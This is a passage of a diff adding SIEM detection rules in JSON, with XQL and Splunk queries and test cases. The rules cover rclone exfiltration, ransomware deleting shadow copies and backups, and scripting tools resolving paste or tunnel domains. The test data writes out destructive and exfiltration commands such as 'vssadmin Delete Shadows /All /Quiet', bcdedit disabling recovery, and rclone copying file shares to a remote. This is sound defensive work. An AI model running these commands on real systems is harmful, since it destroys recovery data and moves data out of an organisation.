+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.NETWORK and dns_query_name != null\n| filter actor_process_image_name in (\"powershell.exe\", \"pwsh.exe\", \"wscript.exe\", \"cscript.exe\", \"mshta.exe\", \"rundll32.exe\", \"regsvr32.exe\", \"certutil.exe\", \"bitsadmin.exe\", \"cmd.exe\", \"msbuild.exe\") and dns_query_name ~= \"(?i)(^|\\\\.)(pastebin\\\\.com|paste\\\\.ee|hastebin\\\\.com|rentry\\\\.co|raw\\\\.githubusercontent\\\\.com|transfer\\\\.sh|file\\\\.io|gofile\\\\.io|temp\\\\.sh|ngrok\\\\.io|ngrok-free\\\\.app|trycloudflare\\\\.com|cdn\\\\.discordapp\\\\.com|api\\\\.telegram\\\\.org)\\\\.?$\"\n| fields _time, agent_hostname, actor_process_image_name, dns_query_name\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=22\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1))\n| where (lower(process_name)=\"powershell.exe\" OR lower(process_name)=\"pwsh.exe\" OR lower(process_name)=\"wscript.exe\" OR lower(process_name)=\"cscript.exe\" OR lower(process_name)=\"mshta.exe\" OR lower(process_name)=\"rundll32.exe\" OR lower(process_name)=\"regsvr32.exe\" OR lower(process_name)=\"certutil.exe\" OR lower(process_name)=\"bitsadmin.exe\" OR lower(process_name)=\"cmd.exe\" OR lower(process_name)=\"msbuild.exe\") AND match(QueryName, \"(?i)(^|\\\\.)(pastebin\\\\.com|paste\\\\.ee|hastebin\\\\.com|rentry\\\\.co|raw\\\\.githubusercontent\\\\.com|transfer\\\\.sh|file\\\\.io|gofile\\\\.io|temp\\\\.sh|ngrok\\\\.io|ngrok-free\\\\.app|trycloudflare\\\\.com|cdn\\\\.discordapp\\\\.com|api\\\\.telegram\\\\.org)\\\\.?$\")\n| table _time host Image QueryName\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "powershell.exe",
+      "dns.query": "pastebin.com"
+     },
+     {
+      "process.name": "mshta.exe",
+      "dns.query": "abcd-1234.trycloudflare.com"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "chrome.exe",
+      "dns.query": "pastebin.com"
+     },
+     {
+      "process.name": "powershell.exe",
+      "dns.query": "notpastebin.com.evil.example"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0028",
+   "title": "rclone copies data to a remote",
+   "description": "rclone (often renamed) syncing or copying folders to cloud storage, MEGA, FTP or WebDAV. It is the most used exfiltration tool in ransomware intrusions because it is fast and looks like backup traffic.",
+   "attack": [
+    "T1567.002",
+    "T1048"
+   ],
+   "tactic": "exfiltration",
+   "severity": "high",
+   "logsource": "process_creation",
+   "selections": {
+    "rclone_name": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "rclone.exe"
+      ]
+     }
+    ],
+    "transfer_verb": [
+     {
+      "field": "process.command_line",
+      "op": "re",
+      "all": false,
+      "values": [
+       "\\s(copy|copyto|sync|move)\\s"
+      ]
+     }
+    ],
+    "rclone_flags": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "--multi-thread-streams",
+       "--no-check-certificate",
+       "--transfers",
+       "--ignore-existing",
+       "--max-age",
+       "--auto-confirm"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "and": [
+     {
+      "sel": "transfer_verb"
+     },
+     {
+      "or": [
+       {
+        "sel": "rclone_name"
+       },
+       {
+        "sel": "rclone_flags"
+       }
+      ]
+     }
+    ]
+   },
+   "condition_text": "transfer_verb and (rclone_name or rclone_flags)",
+   "triage": [
+    "Read the remote name and find the rclone.conf to learn the destination and credentials.",
+    "Measure how much data left (proxy or firewall bytes out) and which folders were copied."
+   ],
+   "false_positives": [
+    "IT backup jobs that use rclone on purpose. These should run from a fixed path and account."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_command_line ~= \"(?i)\\\\s(copy|copyto|sync|move)\\\\s\" and (action_process_image_name = \"rclone.exe\" or (action_process_image_command_line contains \"--multi-thread-streams\" or action_process_image_command_line contains \"--no-check-certificate\" or action_process_image_command_line contains \"--transfers\" or action_process_image_command_line contains \"--ignore-existing\" or action_process_image_command_line contains \"--max-age\" or action_process_image_command_line contains \"--auto-confirm\"))\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where match(CommandLine, \"(?i)\\\\s(copy|copyto|sync|move)\\\\s\") AND (lower(process_name)=\"rclone.exe\" OR (match(CommandLine, \"(?i)\\\\-\\\\-multi\\\\-thread\\\\-streams\") OR match(CommandLine, \"(?i)\\\\-\\\\-no\\\\-check\\\\-certificate\") OR match(CommandLine, \"(?i)\\\\-\\\\-transfers\") OR match(CommandLine, \"(?i)\\\\-\\\\-ignore\\\\-existing\") OR match(CommandLine, \"(?i)\\\\-\\\\-max\\\\-age\") OR match(CommandLine, \"(?i)\\\\-\\\\-auto\\\\-confirm\")))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "rclone.exe",
+      "process.command_line": "rclone.exe copy D:\\Finance mega:backup -q --ignore-existing"
+     },
+     {
+      "process.name": "svchost64.exe",
+      "process.command_line": "svchost64.exe copy \\\\fs01\\HR remote:x --transfers 16 --multi-thread-streams 8"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "robocopy.exe",
+      "process.command_line": "robocopy D:\\Finance E:\\Backup /MIR"
+     },
+     {
+      "process.name": "rclone.exe",
+      "process.command_line": "rclone.exe config"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0029",
+   "title": "Shadow copies, backups or boot recovery removed",
+   "description": "vssadmin or WMI deleting shadow copies, shrinking shadow storage, wbadmin deleting the backup catalog, or bcdedit disabling recovery. Ransomware does this minutes before or during encryption so the victim cannot roll back.",
+   "attack": [
+    "T1490"
+   ],
+   "tactic": "impact",
+   "severity": "critical",
+   "logsource": "process_creation",
+   "selections": {
+    "vssadmin": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "vssadmin.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "re",
+      "all": false,
+      "values": [
+       "(delete\\s+shadows|resize\\s+shadowstorage)"
+      ]
+     }
+    ],
+    "wmic": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "wmic.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": true,
+      "values": [
+       "shadowcopy",
+       "delete"
+      ]
+     }
+    ],
+    "powershell": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "powershell.exe",
+       "pwsh.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": true,
+      "values": [
+       "win32_shadowcopy",
+       "delete"
+      ]
+     }
+    ],
+    "wbadmin": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "wbadmin.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "re",
+      "all": false,
+      "values": [
+       "delete\\s+(catalog|systemstatebackup|backup)"
+      ]
+     }
+    ],
+    "bcdedit": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "bcdedit.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "recoveryenabled no",
+       "bootstatuspolicy ignoreallfailures"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "or": [
+     {
+      "or": [
+       {
+        "or": [
+         {
+          "or": [
+           {
+            "sel": "vssadmin"
+           },
+           {
+            "sel": "wmic"
+           }
+          ]
+         },
+         {
+          "sel": "powershell"
+         }
+        ]
+       },
+       {
+        "sel": "wbadmin"
+       }
+      ]
+     },
+     {
+      "sel": "bcdedit"
+     }
+    ]
+   },
+   "condition_text": "vssadmin or wmic or powershell or wbadmin or bcdedit",
+   "triage": [
+    "Treat as active ransomware. Isolate the host now, then investigate.",
+    "Check other hosts for the same command in the same minutes; it is usually pushed everywhere at once."
+   ],
+   "false_positives": [
+    "Backup software rotating its own shadow copies (usually through the VSS API, not vssadmin)."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter ((((action_process_image_name = \"vssadmin.exe\" and action_process_image_command_line ~= \"(?i)(delete\\\\s+shadows|resize\\\\s+shadowstorage)\") or (action_process_image_name = \"wmic.exe\" and (action_process_image_command_line contains \"shadowcopy\" and action_process_image_command_line contains \"delete\"))) or (action_process_image_name in (\"powershell.exe\", \"pwsh.exe\") and (action_process_image_command_line contains \"win32_shadowcopy\" and action_process_image_command_line contains \"delete\"))) or (action_process_image_name = \"wbadmin.exe\" and action_process_image_command_line ~= \"(?i)delete\\\\s+(catalog|systemstatebackup|backup)\")) or (action_process_image_name = \"bcdedit.exe\" and (action_process_image_command_line contains \"recoveryenabled no\" or action_process_image_command_line contains \"bootstatuspolicy ignoreallfailures\"))\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where ((((lower(process_name)=\"vssadmin.exe\" AND match(CommandLine, \"(?i)(delete\\\\s+shadows|resize\\\\s+shadowstorage)\")) OR (lower(process_name)=\"wmic.exe\" AND (match(CommandLine, \"(?i)shadowcopy\") AND match(CommandLine, \"(?i)delete\")))) OR ((lower(process_name)=\"powershell.exe\" OR lower(process_name)=\"pwsh.exe\") AND (match(CommandLine, \"(?i)win32_shadowcopy\") AND match(CommandLine, \"(?i)delete\")))) OR (lower(process_name)=\"wbadmin.exe\" AND match(CommandLine, \"(?i)delete\\\\s+(catalog|systemstatebackup|backup)\"))) OR (lower(process_name)=\"bcdedit.exe\" AND (match(CommandLine, \"(?i)recoveryenabled\\\\ no\") OR match(CommandLine, \"(?i)bootstatuspolicy\\\\ ignoreallfailures\")))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "vssadmin.exe",
+      "process.command_line": "vssadmin.exe Delete Shadows /All /Quiet"
+     },
+     {
+      "process.name": "wmic.exe",
+      "process.command_line": "wmic shadowcopy delete"
+     },
+     {
+      "process.name": "bcdedit.exe",
+      "process.command_line": "bcdedit /set {default} recoveryenabled No"
+     },
+     {
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell Get-WmiObject Win32_Shadowcopy | ForEach-Object { $_.Delete() }"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "vssadmin.exe",
+      "process.command_line": "vssadmin list shadows"
+     },
+     {
+      "process.name": "bcdedit.exe",
+      "process.command_line": "bcdedit /enum"
+     }
+    ]
+   }
+  }
+ ],
+ "logsources": {
+  "process_creation": {
+   "description": "A process started (Sysmon EID 1, XDR PROCESS_START)",
+   "fields": [
+    "parent.command_line",
+    "parent.name",
+    "parent.path",
+    "process.command_line",
+    "process.name",
+    "process.path",
+    "user"
+   ]
+  },
+  "network_connection": {
+   "description": "An outbound network connection (Sysmon EID 3, XDR NETWORK)",
+   "fields": [
+    "net.remote_ip",
+    "net.remote_port",
+    "process.command_line",
+    "process.name",
+    "process.path",
+    "user"
+   ]
+  },
+  "dns_query": {
+   "description": "A DNS lookup (Sysmon EID 22, XDR NETWORK with dns_query_name)",
+   "fields": [
+    "dns.query",
+    "process.command_line",
+    "process.name",
+    "process.path",
+    "user"
+   ]
+  },
+  "registry_set": {
+   "description": "A registry value was written (Sysmon EID 13, XDR REGISTRY_SET_VALUE)",
+   "fields": [
+    "process.command_line",
+    "process.name",
+    "process.path",
+    "registry.data",
+    "registry.key",
+    "registry.value",
+    "user"
+   ]
+  },
+  "file_event": {
+   "description": "A file was created or written (Sysmon EID 11, XDR FILE)",
+   "fields": [
+    "file.name",
+    "file.path",
+    "process.command_line",
+    "process.name",
+    "process.path",
+    "user"
+   ]
+  }
+ }
+}
